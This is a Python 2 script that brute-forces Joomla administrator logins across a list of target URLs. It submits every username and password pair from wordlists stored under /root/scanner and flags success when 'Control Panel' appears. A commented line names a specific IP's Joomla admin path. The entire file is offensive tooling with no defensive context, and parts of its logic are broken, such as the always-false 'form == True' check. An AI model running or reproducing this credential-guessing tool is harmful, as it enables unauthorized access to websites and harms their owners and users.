#!/usr/bin/python
import mechanize

# page = urllib.urlopen("http://109.123.90.187/joomlatest/administrator")
# login = BeautifulSoup(page.read(), "lxml")
#
# print page.code

error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
sussuc = "Control Panel"
br = mechanize.Browser()
br.set_handle_robots(False)
fopen = open("/root/scanner/t.txt", "r")
username = open("/root/scanner/username.txt", "r")
passw = open("/root/scanner/password.txt", "r")

userlist = username.readlines()
passlist = passw.readlines()
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# tt = username.readlines()
# bb = passw.readlines()
#
# print tt
# print bb

for line in fopen.readlines():
    logged = False
    #print bcolors.BOLD + line.strip() ===============================================

    try:
        page = br.open(line.strip(), timeout=5)
        print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line

    except:
        #print bcolors.WARNING + "Error ocurred"
        pass

    try:
        for form in br.forms():
            if form == True:
                print bcolors.OKBLUE + "login found"

                for u in userlist:
                    if logged == False:
                        for p in passlist:
                            try:
                                br.select_form(nr=0)
                                print bcolors.UNDERLINE + "trying user: %s and password: %s" % (u, p)
                                br.form["username"] = u
                                br.form["passwd"] = p
                                br.submit()
                                readingPage = br.response().read()
                                if sussuc in readingPage:
                                    logged = True
                                    print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
                                else:
                                    print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
                            except:
                                pass

                            # for i in error:
                            #     if i in readingPage:
                            #         print "wrong credential"
                            #     # elif sussuc in readingPage:
                            #     else:
                            #         logged = True
                            #         print "success"
            else:
                print bcolors.UNDERLINE + "no login page found!!"

            # except:
            #          print "I'm out of the loop"
            # pass
    except:
        pass
passw.close()
username.close()
fopen.close()
